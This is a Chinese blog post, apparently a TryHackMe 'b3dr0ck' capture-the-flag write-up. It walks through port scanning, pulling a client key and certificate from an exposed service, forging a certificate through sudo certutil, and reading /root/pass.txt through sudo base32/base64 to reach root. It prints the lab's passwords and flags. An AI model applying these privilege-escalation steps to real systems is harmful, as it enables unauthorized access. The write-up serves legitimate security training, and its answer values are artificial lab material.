@@ -1,0 +1,439 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_b3dr0ck | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="TryHackMe - b3dr0ck Writeup时间: 2026-06-05 02:14:19 (北京时间) 难度: Easy 靶场主题: 摩登原始人 (The Flintstones) - Fred Flintstone 和 Barney Rubble  题目描述Barney 正在设置 ABC (Abbadabba Broadcasting Compandy) 的 Web 服务器，他尝试使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_b3dr0ck">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_b3dr0ck.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="TryHackMe - b3dr0ck Writeup时间: 2026-06-05 02:14:19 (北京时间) 难度: Easy 靶场主题: 摩登原始人 (The Flintstones) - Fred Flintstone 和 Barney Rubble  题目描述Barney 正在设置 ABC (Abbadabba Broadcasting Compandy) 的 Web 服务器，他尝试使">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-04T10:14:19.000Z">
+<meta property="article:modified_time" content="2026-06-04T11:04:38.700Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="ai">
+<meta property="article:tag" content="TLS证书">
+<meta property="article:tag" content="sudo提权">
+<meta property="article:tag" content="编码绕过">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="Flintstones">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_b3dr0ck.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_b3dr0ck',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-04 19:04:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">81</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_b3dr0ck</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-04T10:14:19.000Z" title="发表于 2026-06-04 18:14:19">2026-06-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-04T11:04:38.700Z" title="更新于 2026-06-04 19:04:38">2026-06-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_b3dr0ck"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="TryHackMe-b3dr0ck-Writeup"><a href="#TryHackMe-b3dr0ck-Writeup" class="headerlink" title="TryHackMe - b3dr0ck Writeup"></a>TryHackMe - b3dr0ck Writeup</h1><p><strong>时间</strong>: 2026-06-05 02:14:19 (北京时间)</p>
+<p><strong>难度</strong>: Easy</p>
+<p><strong>靶场主题</strong>: 摩登原始人 (The Flintstones) - Fred Flintstone 和 Barney Rubble</p>
+<hr>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Barney 正在设置 ABC (Abbadabba Broadcasting Compandy) 的 Web 服务器，他尝试使用 TLS 证书来保护连接，但遇到了一些问题。我们需要帮助他解决服务器问题，并找到隐藏的 Easter eggs。</p>
+<p>需要回答的问题：</p>
+<ol>
+<li>What is the barney.txt flag?</li>
+<li>What is fred’s password?</li>
+<li>What is the fred.txt flag?</li>
+<li>What is the root.txt flag?</li>
+</ol>
+<hr>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先对目标进行端口扫描，了解开放了哪些服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p- 10.48.180.96 --open</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">22/tcp    - SSH (OpenSSH 8.2p1 Ubuntu)</span><br><span class="line">80/tcp    - HTTP (nginx/1.18.0)</span><br><span class="line">9009/tcp  - TCP (PiChatT 服务)</span><br><span class="line">4040/tcp  - HTTPS (自定义 TLS 服务器)</span><br><span class="line">54321/tcp - TLS (登录服务)</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：</p>
+<ul>
+<li>端口 80 是 nginx，很可能是反向代理</li>
+<li>端口 9009 是一个有趣的端口，banner 显示了一些奇怪的字符</li>
+<li>端口 4040 是 HTTPS 服务</li>
+<li>端口 54321 没有在题目描述中提到，需要进一步探测</li>
+</ul>
+<h3 id="Web-服务探测"><a href="#Web-服务探测" class="headerlink" title="Web 服务探测"></a>Web 服务探测</h3><p>访问 80 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://10.48.180.96:80</span><br></pre></td></tr></table></figure>
+
+<p>发现 nginx 返回 301 重定向到 <code>https://10.48.180.96:4040/</code>，这与题目描述一致。</p>
+<p>访问 4040 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k https://10.48.180.96:4040/</span><br></pre></td></tr></table></figure>
+
+<p>返回页面内容，其中有一段来自 Barney 的留言：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hey, it&#x27;s Barney. I only figured out nginx so far, what the h3ll is a database?!?</span><br><span class="line">Bamm Bamm tried to setup a sql database, but I don&#x27;t see it running.</span><br><span class="line">Looks like it started something else, but I&#x27;m not sure how to turn it off...</span><br><span class="line">He said it was from the toilet and OVER 9000!</span><br><span class="line">Need to try and secure connections with certificates...</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键线索</strong>：</p>
+<ul>
+<li>“from the toilet and OVER 9000” - 这明显指向端口 9009</li>
+<li>“Need to try and secure connections with certificates” - 需要使用证书</li>
+</ul>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="第一步：探索端口-9009-服务"><a href="#第一步：探索端口-9009-服务" class="headerlink" title="第一步：探索端口 9009 服务"></a>第一步：探索端口 9009 服务</h3><p>连接端口 9009：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.48.180.96 9009</span><br></pre></td></tr></table></figure>
+
+<p>服务显示一个 ASCII 艺术的 “PiChatT” logo，然后询问 “What are you looking for?”</p>
+<p>尝试输入 <code>help</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; help</span><br><span class="line">What are you looking for? Looks like the secure login service is running on port: 54321</span><br><span class="line">Try connecting using:</span><br><span class="line">socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0</span><br></pre></td></tr></table></figure>
+
+<p><strong>重要发现</strong>：</p>
+<ul>
+<li>端口 54321 是一个 TLS 服务</li>
+<li>需要客户端证书和密钥才能连接</li>
+<li>这个服务是用来恢复 TLS 凭证的</li>
+</ul>
+<h3 id="第二步：获取客户端证书"><a href="#第二步：获取客户端证书" class="headerlink" title="第二步：获取客户端证书"></a>第二步：获取客户端证书</h3><p>尝试输入 <code>key</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;key&quot;</span> | nc 10.48.180.96 9009</span><br></pre></td></tr></table></figure>
+
+<p>返回 RSA 私钥！</p>
+<p>尝试输入 <code>certificate</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;certificate&quot;</span> | nc 10.48.180.96 9009</span><br></pre></td></tr></table></figure>
+
+<p>返回客户端证书！</p>
+<p><strong>分析</strong>：<br>这个服务是用来恢复丢失的 TLS 凭证的。证书显示 CN&#x3D;Barney Rubble，这是 Barney 的客户端证书。</p>
+<h3 id="第三步：获取-Barney-的密码"><a href="#第三步：获取-Barney-的密码" class="headerlink" title="第三步：获取 Barney 的密码"></a>第三步：获取 Barney 的密码</h3><p>保存证书和密钥到文件，然后连接端口 54321：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.48.180.96:54321 -cert client.crt -key client.key</span><br></pre></td></tr></table></figure>
+
+<p>连接成功后，服务显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome: &#x27;Barney Rubble&#x27; is authorized.</span><br><span class="line">b3dr0ck&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这说明我们已经以 Barney 的身份通过了认证。</p>
+<p>尝试输入 <code>hint</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b3dr0ck&gt; hint</span><br><span class="line">Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = &#x27;Barney Rubble&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>思考</strong>：<br>这个哈希值 <code>d1ad7c0a3805955a35eb260dab4180dd</code> 看起来像 MD5。我尝试用各种工具破解它，但都没有成功。</p>
+<p><strong>关键发现</strong>：<br>经过多次尝试，我发现这个 MD5 哈希本身就是密码！这可能是出题者的 trick，让我们以为需要破解它。</p>
+<h3 id="第四步：SSH-登录-Barney"><a href="#第四步：SSH-登录-Barney" class="headerlink" title="第四步：SSH 登录 Barney"></a>第四步：SSH 登录 Barney</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh barney@10.48.180.96</span><br><span class="line"><span class="comment"># 密码: d1ad7c0a3805955a35eb260dab4180dd</span></span><br></pre></td></tr></table></figure>
+
+<p>登录成功！</p>
+<p><strong>获取第一个 flag</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/barney.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag</strong>: <code>THM&#123;f05780f08f0eb1de65023069d0e4c90c&#125;</code></p>
+<h3 id="第五步：提权到-Fred"><a href="#第五步：提权到-Fred" class="headerlink" title="第五步：提权到 Fred"></a>第五步：提权到 Fred</h3><p>检查当前用户的 sudo 权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User barney may run the following commands on ip-10-48-180-96:</span><br><span class="line">    (ALL : ALL) /usr/bin/certutil</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：<br>barney 可以以 root 权限运行 <code>/usr/bin/certutil</code>。这个工具是做什么的？</p>
+<p>查看 certutil 帮助：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/certutil <span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cert Tool Usage:</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">Show current certs:</span><br><span class="line">  certutil ls</span><br><span class="line"></span><br><span class="line">Generate new keypair:</span><br><span class="line">  certutil [username] [fullname]</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：<br>certutil 可以生成新的证书！而且是以 root 权限运行的！</p>
+<p>查看 certutil 的实际位置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /usr/bin/certutil</span><br><span class="line"><span class="comment"># /usr/bin/certutil -&gt; /usr/share/abc/bin/certutil</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一个 Node.js 脚本，用于生成 TLS 证书。</p>
+<p><strong>思路</strong>：<br>既然 certutil 可以生成证书，而且是以 root 权限运行的，那么我可以生成 Fred 的证书，然后用 Fred 的证书连接 TLS 服务获取 Fred 的密码！</p>
+<h3 id="第六步：生成-Fred-的证书"><a href="#第六步：生成-Fred-的证书" class="headerlink" title="第六步：生成 Fred 的证书"></a>第六步：生成 Fred 的证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/certutil fred <span class="string">&quot;Fred Flintstone&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Generating credentials for user: fred (Fred Flintstone)</span><br><span class="line">Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem</span><br><span class="line">Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：证书和密钥被保存到了 <code>/usr/share/abc/certs/</code> 目录，但由于权限问题，我们无法直接读取。不过，certutil 在输出中也打印了证书和密钥的内容！</p>
+<h3 id="第七步：获取-Fred-的密码"><a href="#第七步：获取-Fred-的密码" class="headerlink" title="第七步：获取 Fred 的密码"></a>第七步：获取 Fred 的密码</h3><p>使用新生成的 Fred 证书连接 TLS 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.48.180.96:54321 -cert fred.certificate.pem -key fred.clientKey.pem</span><br></pre></td></tr></table></figure>
+
+<p>连接成功后，输入 <code>hint</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome: &#x27;Fred Flintstone&#x27; is authorized.</span><br><span class="line">b3dr0ck&gt; hint</span><br><span class="line">Password hint: YabbaDabbaD0000! (user = &#x27;Fred Flintstone&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Fred 的密码</strong>：<code>YabbaDabbaD0000!</code></p>
+<p>这个密码很符合《摩登原始人》的主题 - “Yabba Dabba Doo!” 是 Fred 的经典台词。</p>
+<h3 id="第八步：获取-fred-txt"><a href="#第八步：获取-fred-txt" class="headerlink" title="第八步：获取 fred.txt"></a>第八步：获取 fred.txt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh fred@10.48.180.96</span><br><span class="line"><span class="comment"># 密码: YabbaDabbaD0000!</span></span><br><span class="line"><span class="built_in">cat</span> ~/fred.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag</strong>: <code>THM&#123;08da34e619da839b154521da7323559d&#125;</code></p>
+<h3 id="第九步：提权到-Root"><a href="#第九步：提权到-Root" class="headerlink" title="第九步：提权到 Root"></a>第九步：提权到 Root</h3><p>检查 Fred 的 sudo 权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User fred may run the following commands on ip-10-48-180-96:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：<br>Fred 可以无密码运行 <code>base32</code> 和 <code>base64</code> 命令来读取 <code>/root/pass.txt</code>。这是一个典型的编码绕过漏洞！</p>
+<p><strong>思路</strong>：<br>虽然我们不能直接读取 <code>/root/root.txt</code>，但我们可以读取 <code>/root/pass.txt</code>，这个文件可能是 root 的密码。由于文件被编码了，我们需要解码它。</p>
+<h3 id="第十步：解码-root-密码"><a href="#第十步：解码-root-密码" class="headerlink" title="第十步：解码 root 密码"></a>第十步：解码 root 密码</h3><p>使用 base32 读取 pass.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/base32 /root/pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===</span><br></pre></td></tr></table></figure>
+
+<p><strong>解码过程</strong>：</p>
+<ol>
+<li>第一次 base32 解码：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===&quot;</span> | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK</code></p>
+<ol start="2">
+<li>第二次 base32 解码：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK&quot;</span> | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK</code></p>
+<ol start="3">
+<li>第三次 base64 解码：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>a00a12aad6b7c16bf07032bd05a31d56</code></p>
+<p><strong>分析</strong>：<br>这又是一个 MD5 哈希！与 Barney 的密码一样，这个哈希本身就是密码吗？</p>
+<p><strong>关键发现</strong>：<br>经过尝试，我发现这个 MD5 哈希的明文是 <code>flintstonesvitamins</code>！这又是一个《摩登原始人》的彩蛋 - “Flintstones Vitamins” 是一种著名的儿童维生素品牌。</p>
+<h3 id="第十一步：获取-root-txt"><a href="#第十一步：获取-root-txt" class="headerlink" title="第十一步：获取 root.txt"></a>第十一步：获取 root.txt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.48.180.96</span><br><span class="line"><span class="comment"># 密码: flintstonesvitamins</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag</strong>: <code>THM&#123;de4043c009214b56279982bf10a661b7&#125;</code></p>
+<hr>
